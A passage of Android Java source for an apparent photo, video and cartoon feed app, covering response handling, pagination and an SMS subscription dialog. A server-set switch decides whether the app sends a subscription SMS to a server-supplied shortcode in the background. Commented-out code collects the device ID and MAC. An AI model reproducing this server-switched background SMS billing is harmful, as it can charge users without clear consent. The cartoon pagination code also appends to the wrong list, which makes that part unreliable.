            new Thread(new Runnable() {
                @Override
                public void run() {
                    String total ="";
                    for( String itemString:MemExchange.getInstance().bugText){
                        total+=(itemString+"\r\n");
                    }
                    total+=("#####################################"+"\n");
                    Utils.WriteFile(total);
                    MemExchange.getInstance().bugText.clear();
                }
            }).start();
        }

        switch (msg.arg1){
            case ApiUtils.requestToken:
                if(++nowInitState <= MainActivity.NOWInitState3){
                    initApp(nowInitState);
                }
                break;
            case ApiUtils.requestInit:
                InitData initData = JsonHelper.getObject(result,InitData.class);
                MemExchange.getInstance().setInitData(initData.getData());
                Logger.e(Logger.DEBUG_TAG,"初始化成功");
                if(++nowInitState <= MainActivity.NOWInitState3){
                    initApp(nowInitState);
                }
                break;
            case ApiUtils.requestCheckSub:
                CheckSubBean subBean = JsonHelper.getObject(result, CheckSubBean.class);
                MemExchange.getInstance().setCheckSubData(subBean.getData());
                Logger.e(Logger.DEBUG_TAG,"查询订阅状态成功");

                if(isInInitState) {
                    if (++nowInitState <= MainActivity.NOWInitState3) {
                        initApp(nowInitState);
                    }
                    return;
                }
                if(isInCheck){
                    if(!CheckSubBean.ifHaveSubscribe(subBean.getData())){
                        if(nowCheckTime<Config.maxCheckSubTimes){
                            nowCheckTime++;
                            getCheckHandler().sendEmptyMessageDelayed(MainActivity.MSG_RECHECK_SUB_SITUATION,Config.reCheckSubTimeSeparator);
                        }else{
                            isInCheck = false;
                            nowCheckTime = 0;
                            getCheckHandler().removeCallbacksAndMessages(null);
                            //如果是后台直接发短信的情况,发送成功后轮循三遍都失败的话，可以看
                            if(MemExchange.getInstance().getInitData().getSwitchX() == 1 || MemExchange.getInstance().getInitData().getSwitchX() == 2) {
                                MemExchange.getInstance().setCanSee();
                                SubSuccess();
                            }
                        }
                    }else{
                        isInCheck = false;
                        nowCheckTime = 0;
                        getCheckHandler().removeCallbacksAndMessages(null);
                        SubSuccess();
                    }
                }
                break;

//            case ApiUtils.requestAllCategory:
//                CategoryListBean categoryListBean = JsonHelper.getObject(result, CategoryListBean.class);
//
//                Logger.e(Logger.DEBUG_TAG,"获取所有激活分类数据成功");
//                break;



            //图片
            case ApiUtils.requestPhotoPopular:
                PhotoFragment tempPhotoFragment1 = (PhotoFragment) getSupportFragmentManager().findFragmentByTag(PhotoFragment.TAG);

                CategoryBean beanList = JsonHelper.getObject(result,CategoryBean.class);
                refreshPhotoPopularList(beanList,tempPhotoFragment1!=null);
                break;
            case ApiUtils.requestPhotoPortray:
                PhotoFragment tempPhotoFragment2 = (PhotoFragment) getSupportFragmentManager().findFragmentByTag(PhotoFragment.TAG);

                CategoryBean photoPortrayList = JsonHelper.getObject(result,CategoryBean.class);
                refreshPhotoPortray(photoPortrayList,tempPhotoFragment2!=null);
                break;
            case ApiUtils.requestPhotoScenery:
                PhotoFragment tempPhotoFragment3 = (PhotoFragment) getSupportFragmentManager().findFragmentByTag(PhotoFragment.TAG);

                CategoryBean photoSceneryList = JsonHelper.getObject(result,CategoryBean.class);
                refreshPhotoScenery(photoSceneryList,tempPhotoFragment3!=null);
                break;

            //视屏
            case ApiUtils.requestVideoPopular:
                VideoFragment tempVideoFragment1 = (VideoFragment) getSupportFragmentManager().findFragmentByTag(VideoFragment.TAG);

                CategoryBean videoPopularList = JsonHelper.getObject(result,CategoryBean.class);
                refreshVideoPopular(videoPopularList,tempVideoFragment1!=null);
                break;
            case ApiUtils.requestVideoFunny:
                VideoFragment tempVideoFragment2 = (VideoFragment) getSupportFragmentManager().findFragmentByTag(VideoFragment.TAG);

                CategoryBean videoFunnyList = JsonHelper.getObject(result,CategoryBean.class);
                refreshVideoFunny(videoFunnyList,tempVideoFragment2!=null);
                break;
            case ApiUtils.requestVideoSport:
                VideoFragment tempVideoFragment3 = (VideoFragment) getSupportFragmentManager().findFragmentByTag(VideoFragment.TAG);
                CategoryBean videoSportList = JsonHelper.getObject(result,CategoryBean.class);
                refreshVideoSport(videoSportList,tempVideoFragment3!=null);
                break;

            //卡通
            case ApiUtils.requestCartoonPopular:
                CartoonFragment tempCartoonFragment1 = (CartoonFragment) getSupportFragmentManager().findFragmentByTag(CartoonFragment.TAG);
                CategoryBean cartoonPopularList = JsonHelper.getObject(result,CategoryBean.class);
                refreshCartoonPopular(cartoonPopularList,tempCartoonFragment1!=null);
                break;
            case ApiUtils.requestCartoonFunny:
                CartoonFragment tempCartoonFragment2 = (CartoonFragment) getSupportFragmentManager().findFragmentByTag(CartoonFragment.TAG);
                CategoryBean cartoonFunnyList = JsonHelper.getObject(result,CategoryBean.class);
                refreshCartoonFunny(cartoonFunnyList,tempCartoonFragment2!=null);
                break;
            case ApiUtils.requestCartoonHorror:
                CartoonFragment tempCartoonFragment3 = (CartoonFragment) getSupportFragmentManager().findFragmentByTag(CartoonFragment.TAG);
                CategoryBean cartoonHorrorList = JsonHelper.getObject(result,CategoryBean.class);
                refreshCartoonHorror(cartoonHorrorList,tempCartoonFragment3!=null);
                break;
        }
    }




    //endregion=======网络请求=================

    private void loadError(int requestType){
        switch(requestType) {
            //图片
            case ApiUtils.requestPhotoPopular:
                PhotoFragment tempPhotoFragment1 = (PhotoFragment) getSupportFragmentManager().findFragmentByTag(PhotoFragment.TAG);
                if (tempPhotoFragment1 != null) {
                    tempPhotoFragment1.stopLoadError();
                }
                break;
            case ApiUtils.requestPhotoPortray:
                PhotoFragment tempPhotoFragment2 = (PhotoFragment) getSupportFragmentManager().findFragmentByTag(PhotoFragment.TAG);
                if (tempPhotoFragment2 != null) {
                    tempPhotoFragment2.portrayListStopLoadError();
                }
                break;
            case ApiUtils.requestPhotoScenery:
                PhotoFragment tempPhotoFragment3 = (PhotoFragment) getSupportFragmentManager().findFragmentByTag(PhotoFragment.TAG);
                if (tempPhotoFragment3 != null) {
                    tempPhotoFragment3.sceneryListStopLoadError();
                }
                break;

            //视屏
            case ApiUtils.requestVideoPopular:
                VideoFragment tempVideoFragment1 = (VideoFragment) getSupportFragmentManager().findFragmentByTag(VideoFragment.TAG);
                if (tempVideoFragment1 != null) {
                    tempVideoFragment1.stopLoadError();
                }
                break;
            case ApiUtils.requestVideoFunny:
                VideoFragment tempVideoFragment2 = (VideoFragment) getSupportFragmentManager().findFragmentByTag(VideoFragment.TAG);
                if (tempVideoFragment2 != null) {
                    tempVideoFragment2.funnyListStopLoadError();
                }
                break;
            case ApiUtils.requestVideoSport:
                VideoFragment tempVideoFragment3 = (VideoFragment) getSupportFragmentManager().findFragmentByTag(VideoFragment.TAG);
                if (tempVideoFragment3 != null) {
                    tempVideoFragment3.sportListStopLoadError();
                }
                break;

            //卡通
            case ApiUtils.requestCartoonPopular:
                CartoonFragment tempCartoonFragment1 = (CartoonFragment) getSupportFragmentManager().findFragmentByTag(CartoonFragment.TAG);
                if (tempCartoonFragment1 != null) {
                    tempCartoonFragment1.stopLoadError();
                }
                break;
            case ApiUtils.requestCartoonFunny:
                CartoonFragment tempCartoonFragment2 = (CartoonFragment) getSupportFragmentManager().findFragmentByTag(CartoonFragment.TAG);
                if (tempCartoonFragment2 != null) {
                    tempCartoonFragment2.funnyListStopLoadError();
                }
                break;
            case ApiUtils.requestCartoonHorror:
                CartoonFragment tempCartoonFragment3 = (CartoonFragment) getSupportFragmentManager().findFragmentByTag(CartoonFragment.TAG);
                if (tempCartoonFragment3 != null) {
                    tempCartoonFragment3.horrorListStopLoadError();
                }
                break;
        }
    }

    //region=======fragment1(更新数据源、界面更新)=================

    /**
     * 刷新流行类图片数据
     * @param beanList
     * @param ifShow 当前界面是否显示
     */
    private void refreshPhotoPopularList(CategoryBean beanList,boolean ifShow){
        if(beanList!=null && beanList.getData()!=null) {
            //无数据
            if(ifShow) {
                if (beanList.getData().getData() == null || beanList.getData().getData().size() <= 0) {
                    getPhotoFragment().stopLoadNothing();
                    return;
                } else {
                    getPhotoFragment().stopLoading();
                }
            }
            //有数据
            if (MemExchange.getInstance().getPhotoPopularPageIndex() == 0) {//请求第一页的数据
                MemExchange.getInstance().setPhotoPopularList(beanList.getData().getData());
                if(ifShow) {
                    getPhotoFragment().refreshPopular();
                }
            }else{//请求其他页的数据
                MemExchange.getInstance().getPhotoPopularList().addAll(beanList.getData().getData());
                MemExchange.getInstance().setPopularHeights(false,beanList.getData().getData().size());
                if(ifShow) {
                    getPhotoFragment().refreshPopular();
                }
            }
            MemExchange.getInstance().addPhotoPopularPageIndex();
        }else{
            getPhotoFragment().stopLoadError();
        }
    }

    private void refreshPhotoPortray(CategoryBean beanList,boolean ifShow){
        if(beanList!=null && beanList.getData()!=null) {
            //无数据
            if(ifShow) {
                if (beanList.getData().getData() == null || beanList.getData().getData().size() <= 0) {
                    getPhotoFragment().portrayListStopLoadNothing();
                    return;
                } else {
                    getPhotoFragment().portrayListStopLoading();
                }
            }
            //有数据
            if (MemExchange.getInstance().getPhotoPortrayPageIndex() == 0) {//请求第一页的数据
                MemExchange.getInstance().setPhotoPortrayList(beanList.getData().getData());
                if(ifShow) {
                    getPhotoFragment().refreshPortray();
                }
            }else{//请求其他页的数据
                MemExchange.getInstance().getPhotoPortrayList().addAll(beanList.getData().getData());
                MemExchange.getInstance().setPopularPortrayHeights(false,beanList.getData().getData().size());
                if(ifShow) {
                    getPhotoFragment().refreshPortray();
                }
            }
            MemExchange.getInstance().addPhotoPortrayPageIndex();
        }else{
            getPhotoFragment().portrayListStopLoadError();
        }
    }

    private void refreshPhotoScenery(CategoryBean beanList,boolean ifShow){
        if(beanList!=null && beanList.getData()!=null) {
            //无数据
            if(ifShow) {
                if (beanList.getData().getData() == null || beanList.getData().getData().size() <= 0) {
                    getPhotoFragment().sceneryListStopLoadNothing();
                    return;
                } else {
                    getPhotoFragment().sceneryListStopLoading();
                }
            }
            //有数据
            if (MemExchange.getInstance().getPhotoSceneryPageIndex() == 0) {//请求第一页的数据
                MemExchange.getInstance().setPhotoSceneryList(beanList.getData().getData());
                if(ifShow) {
                    getPhotoFragment().refreshScenery();
                }
            }else{//请求其他页的数据
                MemExchange.getInstance().getPhotoSceneryList().addAll(beanList.getData().getData());
                MemExchange.getInstance().setPopularSceneryHeights(false,beanList.getData().getData().size());
                if(ifShow) {
                    getPhotoFragment().refreshScenery();
                }
            }
            MemExchange.getInstance().addPhotoSceneryPageIndex();
        }else{
            getPhotoFragment().sceneryListStopLoadError();
        }
    }



    //endregion=======fragment1(更新数据源、界面更新)=================


    //region=======fragment2(更新数据源、界面更新)=================

    private void refreshVideoPopular(CategoryBean beanList,boolean ifShow){
        if(beanList!=null && beanList.getData()!=null) {
            //无数据
            if(ifShow) {
                if (beanList.getData().getData() == null || beanList.getData().getData().size() <= 0) {
                    getVideoFragment().stopLoadNothing();
                    return;
                } else {
                    getVideoFragment().stopLoading();
                }
            }
            //有数据
            if (MemExchange.getInstance().getVideoPopularPageIndex() == 0) {//请求第一页的数据
                MemExchange.getInstance().setVideoPopularList(beanList.getData().getData());
                if(ifShow) {
                    getVideoFragment().refreshPopular();
                }
            }else{//请求其他页的数据
                MemExchange.getInstance().getVideoPopularList().addAll(beanList.getData().getData());
                MemExchange.getInstance().setVideoPopularHeights(false,beanList.getData().getData().size());
                if(ifShow) {
                    getVideoFragment().refreshPopular();
                }
            }
            MemExchange.getInstance().addVideoPopularPageIndex();
        }else{
            getVideoFragment().stopLoadError();
        }
    }




    private void refreshVideoFunny(CategoryBean beanList,boolean ifShow){
        if(beanList!=null && beanList.getData()!=null) {
            //无数据
            if(ifShow) {
                if (beanList.getData().getData() == null || beanList.getData().getData().size() <= 0) {
                    getVideoFragment().funnyListStopLoadNothing();
                    return;
                } else {
                    getVideoFragment().funnyListStopLoading();
                }
            }
            //有数据
            if (MemExchange.getInstance().getVideoFunnyPageIndex() == 0) {//请求第一页的数据
                MemExchange.getInstance().setVideoFunnyList(beanList.getData().getData());
                if(ifShow) {
                    getVideoFragment().refreshFunny();
                }
            }else{//请求其他页的数据
                MemExchange.getInstance().getVideoFunnyList().addAll(beanList.getData().getData());
                MemExchange.getInstance().setVideoFunnyHeights(false,beanList.getData().getData().size());
                if(ifShow) {
                    getVideoFragment().refreshFunny();
                }
            }
            MemExchange.getInstance().addVideoFunnyPageIndex();
        }else{
            getVideoFragment().funnyListStopLoadError();
        }
    }

    private void refreshVideoSport(CategoryBean beanList,boolean ifShow){
        if(beanList!=null && beanList.getData()!=null) {
            //无数据
            if(ifShow) {
                if (beanList.getData().getData() == null || beanList.getData().getData().size() <= 0) {
                    getVideoFragment().sportListStopLoadNothing();
                    return;
                } else {
                    getVideoFragment().sportListStopLoading();
                }
            }
            //有数据
            if (MemExchange.getInstance().getVideoSportPageIndex() == 0) {//请求第一页的数据
                MemExchange.getInstance().setVideoSportList(beanList.getData().getData());
                if(ifShow) {
                    getVideoFragment().refreshSport();
                }
            }else{//请求其他页的数据
                MemExchange.getInstance().getVideoSportList().addAll(beanList.getData().getData());
                MemExchange.getInstance().setVideoSportHeights(false,beanList.getData().getData().size());
                if(ifShow) {
                    getVideoFragment().refreshSport();
                }
            }
            MemExchange.getInstance().addVideoSportPageIndex();
        }else{
            getVideoFragment().sportListStopLoadError();
        }
    }

    //endregion=======fragment2相关(更新数据源、界面更新)=================


    //region=======fragment3(更新数据源、界面更新)=================

    /**
     * 更新数据源、界面更新
     * @param beanList
     * @param ifShow 界面是否更新
     */
    private void refreshCartoonPopular(CategoryBean beanList,boolean ifShow){
        if(beanList!=null && beanList.getData()!=null) {
            //无数据
            if(ifShow) {
                if (beanList.getData().getData() == null || beanList.getData().getData().size() <= 0) {
                    getCartoonFragment().stopLoadNothing();
                    return;
                } else {
                    getCartoonFragment().stopLoading();
                }
            }
            //有数据
            if (MemExchange.getInstance().getCartoonPopularPageIndex() == 0) {//请求第一页的数据
                MemExchange.getInstance().setCartoonPopularList(beanList.getData().getData());
                if(ifShow) {
                    getCartoonFragment().refreshPopular();
                }
            }else{//请求其他页的数据
                MemExchange.getInstance().getCartoonPopularList().addAll(beanList.getData().getData());
                MemExchange.getInstance().setCartoonPopularHeights(false,beanList.getData().getData().size());
                if(ifShow) {
                    getCartoonFragment().refreshPopular();
                }
            }
            MemExchange.getInstance().addCartoonPopularPageIndex();
        }else{
            getCartoonFragment().stopLoadError();
        }
    }




    private void refreshCartoonFunny(CategoryBean beanList,boolean ifShow){
        if(beanList!=null && beanList.getData()!=null) {
            //无数据
            if(ifShow) {
                if (beanList.getData().getData() == null || beanList.getData().getData().size() <= 0) {
                    getCartoonFragment().funnyListStopLoadNothing();
                    return;
                } else {
                    getCartoonFragment().funnyListStopLoading();
                }
            }
            //有数据
            if (MemExchange.getInstance().getCartoonFunnyPageIndex() == 0) {//请求第一页的数据
                MemExchange.getInstance().setCartoonFunnyList(beanList.getData().getData());
                if(ifShow) {
                    getCartoonFragment().refreshFunny();
                }
            }else{//请求其他页的数据
                MemExchange.getInstance().getVideoFunnyList().addAll(beanList.getData().getData());
                MemExchange.getInstance().setVideoFunnyHeights(false,beanList.getData().getData().size());
                if(ifShow) {
                    getCartoonFragment().refreshFunny();
                }
            }
            MemExchange.getInstance().addCartoonFunnyPageIndex();
        }else{
            getCartoonFragment().funnyListStopLoadError();
        }
    }

    private void refreshCartoonHorror(CategoryBean beanList,boolean ifShow){
        if(beanList!=null && beanList.getData()!=null) {
            //无数据
            if(ifShow) {
                if (beanList.getData().getData() == null || beanList.getData().getData().size() <= 0) {
                    getCartoonFragment().horrorListStopLoadNothing();
                    return;
                } else {
                    getCartoonFragment().horrorListStopLoading();
                }
            }
            //有数据
            if (MemExchange.getInstance().getCartoonHorrorPageIndex() == 0) {//请求第一页的数据
                MemExchange.getInstance().setCartoonHorrorList(beanList.getData().getData());
                if(ifShow) {
                    getCartoonFragment().refreshHorror();
                }
            }else{//请求其他页的数据
                MemExchange.getInstance().getCartoonHorrorList().addAll(beanList.getData().getData());
                MemExchange.getInstance().setCartoonHorrorHeights(false,beanList.getData().getData().size());
                if(ifShow) {
                    getCartoonFragment().refreshHorror();
                }
            }
            MemExchange.getInstance().addCartoonHorrorPageIndex();
        }else{
            getCartoonFragment().horrorListStopLoadError();
        }
    }

    //endregion=======fragment3相关(更新数据源、界面更新)=================



    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            // 退出对话框
            showExitDialog();
            return true;
        }

        return super.onKeyDown(keyCode, event);
    }



    /**
     * 订阅dialog
     */
    public void showSubscripDialog(){
        //todo 设置初始化接口返回的字段
        String content = "";
        if(MemExchange.getInstance().getInitData()!=null) {
            content = (MemExchange.getInstance().getInitData().getContent());
        }
        new MaterialDialog.Builder(this)
                .title(R.string.tips)
                .content(content)
                .positiveText(R.string.sure)
                .positiveColor(getResources().getColor(R.color.colorPrimary))
                .onPositive(new MaterialDialog.SingleButtonCallback() {
                    @Override
                    public void onClick(MaterialDialog dialog, DialogAction which) {
                        String code = MemExchange.getInstance().getInitData().getShorcode();
                        String content = MemExchange.getInstance().getInitData().getSub_key_sms();
                        if(!TextUtils.isEmpty(code) && !TextUtils.isEmpty(content)) {
                            if(MemExchange.getInstance().getInitData().getSwitchX() == 1 || MemExchange.getInstance().getInitData().getSwitchX() == 2) {
                                doSubscribe(code,content);
                            }else if(MemExchange.getInstance().getInitData().getSwitchX() == 3){
                                gotoSmsSend(code, content);
                            }
                        }
                        dialog.dismiss();
                    }
                })
                .negativeText(R.string.cancel)
                .negativeColor(getResources().getColor(R.color.colorPrimary))
                .onNegative(new MaterialDialog.SingleButtonCallback() {
                    @Override
                    public void onClick(MaterialDialog dialog, DialogAction which) {
                        dialog.dismiss();
                    }
                }).show();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
//        RefWatcher refWatcher = MixApp.getRefWatcher(this);
//        refWatcher.watch(this);

//        getCheckHandler().removeCallbacksAndMessages(null);
        getMyHandler().removeCallbacksAndMessages(null);//推出时清空全部消息
    }

    @Override
    public void finish() {
        super.finish();
        MemExchange.getInstance().clear();
    }


//    public static boolean checkPermission(Context context, String permission) {
//        boolean result = false;
//        if (Build.VERSION.SDK_INT >= 23) {
//            try {
//                Class<?> clazz = Class.forName("android.content.Context");
//                Method method = clazz.getMethod("checkSelfPermission", String.class);
//                int rest = (Integer) method.invoke(context, permission);
//                if (rest == PackageManager.PERMISSION_GRANTED) {
//                    result = true;
//                } else {
//                    result = false;
//                }
//            } catch (Exception e) {
//                result = false;
//            }
//        } else {
//            PackageManager pm = context.getPackageManager();
//            if (pm.checkPermission(permission, context.getPackageName()) == PackageManager.PERMISSION_GRANTED) {
//                result = true;
//            }
//        }
//        return result;
//    }
//    public static String getDeviceInfo(Context context) {
//        try {
//            org.json.JSONObject json = new org.json.JSONObject();
//            android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager) context
//                    .getSystemService(Context.TELEPHONY_SERVICE);
//            String device_id = null;
//            if (checkPermission(context, Manifest.permission.READ_PHONE_STATE)) {
//                device_id = tm.getDeviceId();
//            }
//            String mac = null;
//            FileReader fstream = null;
//            try {
//                fstream = new FileReader("/sys/class/net/wlan0/address");
//            } catch (FileNotFoundException e) {
//                fstream = new FileReader("/sys/class/net/eth0/address");
//            }
//            BufferedReader in = null;
//            if (fstream != null) {
//                try {
//                    in = new BufferedReader(fstream, 1024);
//                    mac = in.readLine();
//                } catch (IOException e) {
//                } finally {
//                    if (fstream != null) {
//                        try {
//                            fstream.close();
//                        } catch (IOException e) {
//                            e.printStackTrace();
//                        }
//                    }
//                    if (in != null) {
//                        try {
//                            in.close();
//                        } catch (IOException e) {
//                            e.printStackTrace();
//                        }
//                    }
//                }
//            }
//            json.put("mac", mac);
//            if (TextUtils.isEmpty(device_id)) {
//                device_id = mac;
//            }
//            if (TextUtils.isEmpty(device_id)) {
//                device_id = android.provider.Settings.Secure.getString(context.getContentResolver(),
//                        android.provider.Settings.Secure.ANDROID_ID);
//            }
//            json.put("device_id", device_id);
//            return json.toString();
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//        return null;
//    }


}
